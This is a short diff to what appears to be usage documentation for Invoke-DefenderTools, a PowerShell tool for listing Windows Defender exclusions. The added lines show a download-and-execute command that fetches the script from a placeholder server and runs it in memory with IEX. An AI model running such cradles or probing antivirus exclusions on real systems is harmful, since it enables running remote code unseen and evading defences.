@@ -37,6 +37,10 @@ or
 
 PS> Import-Module Invoke-DefenderTools
 
+or
+
+C:\>powershell "IEX (New-Object Net.Webclient).DownloadString('http://server/Invoke-DefenderTools.ps1'); Invoke-DefenderTools -GetExcludes"
+
 Functions:
 
 PS> Invoke-DefenderTools -GetExcludes
